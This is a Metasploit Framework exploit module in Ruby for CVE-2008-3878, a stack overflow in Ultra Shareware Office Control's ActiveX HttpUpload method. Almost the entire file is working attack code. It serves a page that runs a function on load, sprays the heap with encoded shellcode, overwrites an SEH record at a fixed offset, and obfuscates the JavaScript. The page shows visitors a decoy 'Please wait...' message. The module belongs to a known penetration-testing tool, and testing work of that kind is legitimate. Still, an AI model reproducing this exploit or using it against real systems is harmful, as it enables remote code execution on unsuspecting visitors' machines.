##
# $Id: ultraoffice_httpupload.rb 8705 2010-03-04 06:19:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Ultra Shareware Office Control ActiveX HttpUpload Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Ultra Shareware's Office
				Control. When processing the 'HttpUpload' method, the arguments are concatenated
				together to form a command line to run a bundled version of cURL. If the command
				fails to run, a stack-based buffer overflow occurs when building the error 
				message. This is due to the use of sprintf() without proper bounds checking.

				NOTE: Due to input restrictions, this exploit uses a heap-spray to get the payload
				into memory unmodified.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'shinnai', 'jduck' ],
			'Version'        => '$Revision: 8705 $',
			'References'     =>
				[
					[ 'CVE', '2008-3878' ],
					[ 'OSVDB', '47866' ],
					[ 'BID', '30861' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/6318' ]
				],
			'Payload'        =>
				{
					'Space'    => 4096,
					'BadChars' => "\x00", 
					# For HttpUpload args: "\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested with ActiveX v2.0.0.1020 and v2.0.2008.801
	  				[ 'Windows Universal',
						{
							'Ret' => 0x0c0c0c0c  # heap sprayed
							# 0x746C15A9 # p/p/r in msls31.dll
							# EEK, Safe SEH! 0x220118c2  # p/p/r in OfficeCtrl.ocx
						}
					],
				],
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		# ActiveX parameters
		progid = "Ultra.OfficeControl"
		clsid = "00989888-BB72-4E31-A7C6-5F819C24D2F7"

		# Set parameters
		fnname = rand_text_alpha(8+rand(8))
		arg1 = rand_text_alphanumeric(128)
		arg2 = rand_text_alphanumeric(4096) * 10
		seh_offset = 252

		# Build the exploit buffer
		sploit = rand_text_alphanumeric(seh_offset)
		sploit << generate_seh_record(target.ret)

		# Encode variables
		sploit = Rex::Text.to_hex(sploit, '%')
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

      # Prepare the heap spray parameters
		spray_addr = target.ret
		spray_num = "0x%x" % spray_addr

		# Generate the final javascript
		js = %Q|
function #{fnname}()
{
try {
var obj = new ActiveXObject("#{progid}");
var my_unescape = unescape;
var shellcode = '#{shellcode}';
#{js_heap_spray}
sprayHeap(my_unescape(shellcode), #{spray_num}, 0x40000);
var arg1 = my_unescape("#{arg1}");
var arg2 = my_unescape("#{arg2}");
var sploit = my_unescape("#{sploit}");
obj.HttpUpload(arg1, arg2, sploit);
} catch( e ) { window.location = 'about:blank' ; }
}
|

		# Obfuscate the javascript
		opts = {
			'Strings' => true,
			'Symbols' => {
				'Variables' => %w{ obj my_unescape shellcode arg1 arg2 sploit }
			}
		}
		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.obfuscate()

		# Build the final HTML
		content = %Q|<html>
<head>
<script language=javascript>
#{js}
</script>
</head>
<body onload="#{fnname}()">
Please wait...
</body>
</html>
|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		send_response_html(cli, content)

		handler(cli)

	end

end